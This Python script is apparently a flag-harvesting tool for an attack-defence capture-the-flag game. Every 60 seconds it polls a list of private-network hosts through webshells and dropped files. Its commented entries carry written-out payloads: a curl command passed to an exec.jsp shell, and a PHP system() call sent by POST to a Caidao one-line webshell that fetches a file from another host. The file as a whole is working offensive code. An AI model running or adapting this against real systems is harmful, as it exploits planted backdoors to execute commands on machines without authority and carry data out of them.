#!/usr/bin/env python
#-*- coding:utf-8 -*-
import requests
import base64
import string
import time
from datetime import datetime
'''get flag from host_flags:
(type,host,url[,payload])
type:
    1:simple url by get(eg:gf.txt or .php)
    2:exec curl by get(eg:cmd=curl http://xxxx)
    3:caidao oneword webshell by post(eg:eval($_POST[cmd]))
'''

host_flags=(
    #(1,'172.16.5.10:806','/uploadfile/user/b/1/3_1466473584.php'),
    #(1,'172.16.5.10:806','/uploadfile/user/b/1/gf6.txt'),
    #(1,'172.16.5.10:802','/templates/beez_20/gf1.txt')
    #(2,'172.16.8.144:8080','/exec.jsp',{'cmd':'curl -s http://10.0.0.2:8080'})
    #(3,'172.16.80.167','/1.php',{'-7':'system("curl -s http://172.16.80.1:8000/flag.txt");'}),
    (1,'172.16.5.10:8012','/.o'),
    (1,'172.16.5.14:8012','/.o'),
    (1,'172.16.5.15:8012','/.o'),
    (1,'172.16.5.17:8012','/.o'),
    (1,'172.16.5.18:8012','/.o'),
    (1,'172.16.5.19:8012','/.o'),
    )

'''
try to base64 decode
'''
def base64decode(flag_str):
    try:
        str_b = base64.decodestring(flag_str)
        for x in str_b:
            if x not in string.printable:
                return flag_str
        return str_b
    except:
        return flag_str

'''
get flag from shell 
'''
def get_flag(flag_log_file):
    headers = {
        'User-Agent': 'Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)'
    }
    with open(flag_log_file,'a') as f:
        for hf in host_flags:
            flag_type = hf[0]
            host = hf[1]
            url = "http://%s%s"%(host,hf[2])
            try:
                payload = {} if flag_type == 1 else hf[3]         
                if flag_type == 1 or flag_type == 2:       
                    #send request
                    r = requests.get(url,timeout=5,params=payload,headers=headers)
                elif flag_type == 3:
                    r = requests.post(url,timeout=5,data=payload,headers=headers)
                #print flag
                msg = '[+]%s %s::%s:%s' %(datetime.now().strftime('%H:%M:%S'),host,r.text.strip(),base64decode(r.text.strip()))
                f.write(msg+'\n')
                print msg
            except Exception,e:
                print '[-]%s %s:fail->%s!' %(datetime.now().strftime('%H:%M:%S'),host,str(e))


def main():
    flag_log_file = 'getflag.log'
    while True:
        get_flag(flag_log_file)
        time.sleep(60)

if __name__ == '__main__':
    main()

